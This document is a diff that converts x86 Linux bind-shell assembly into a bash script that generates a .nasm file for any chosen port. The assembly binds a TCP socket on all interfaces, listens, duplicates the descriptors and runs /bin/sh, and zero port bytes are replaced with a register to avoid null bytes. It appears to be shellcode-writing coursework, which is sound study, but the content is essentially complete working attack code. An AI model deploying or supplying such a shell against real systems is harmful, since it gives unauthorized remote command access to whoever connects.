@@ -1,3 +1,16 @@
+#!/bin/bash
+
+# Usage: ./template.sh <portnumber>
+# Outputs file ./tcp-bind-<portnumber>.nasm
+
+HEXSTRING=$(printf "%04x" $1 | sed 's/[a-f0-9]\{2\}/& /g')
+byte1=$(echo $HEXSTRING | cut -f1 -d' ' | sed 's/.*/0x&/')
+byte1=$([ "$byte1" == "0x00" ] && echo "dl" || echo $byte1)
+
+byte2=$(echo $HEXSTRING | cut -f2 -d' ' | sed 's/.*/0x&/')
+byte2=$([ "$byte2" == "0x00" ] && echo "dl" || echo $byte2)
+
+TEMPLATE="
 section .text
 global main
 
@@ -24,8 +37,8 @@ main:
     inc ebx             ; SYS_BIND
     ; Setup struct addr
     push edx            ; 0.0.0.0 (this is why we needed EDX at line 5)
-    mov byte [esp], 0x1c    ; Push first byte of port
-    mov byte [esp+1], dl    ; Push second byte of port
+    mov byte [esp], $byte1; Push port byte 1
+    mov byte [esp+1], $byte2; Push port byte 2
     push word 0x2       ; AF_INET
     mov ecx, esp        ; Store struct in ECX
     ; Setup bind arguments
@@ -37,9 +50,9 @@ main:
 
     ; listen(sockid, 2)
     mov eax, edi        ; SYS_SOCKETCALL
-    push ebx            ; Argument "2"
+    push ebx            ; Argument 2
     inc ebx             ; SYS_LISTEN
-    inc ebx             ; (2 bytes instead of 3 for "add ebx, 0x2")
+    inc ebx             ; (2 bytes instead of 3 for add ebx, 0x2)
     ; Setup arguments
     push esi            ; Ref to sockid
     mov ecx, esp        ; Address of listen arguments
@@ -64,12 +77,15 @@ duploop:
     dec ecx             ; Decrement ECX
     jns duploop         ; Loop
 
-    ; execve("//bin/sh", NULL, NULL)
+    ; execve(//bin/sh, NULL, NULL)
     xor eax, eax        ; Zero-out EAX
     mov al, 0x0b        ; SYS_EXECVE
     push edx            ; Push NULL character to stack
-    push 0x68732f6e     ; "hs/n"
-    push 0x69622f2f     ; "ib//"
-    mov ebx, esp        ; Ref to "//bin/sh" from stack
+    push 0x68732f6e     ; hs/n
+    push 0x69622f2f     ; ib//
+    mov ebx, esp        ; Ref to //bin/sh from stack
     inc ecx             ; ECX to 0
     int 0x80            ; Exec syscall
+"
+
+echo "$TEMPLATE" > tcp-bind-$1.nasm
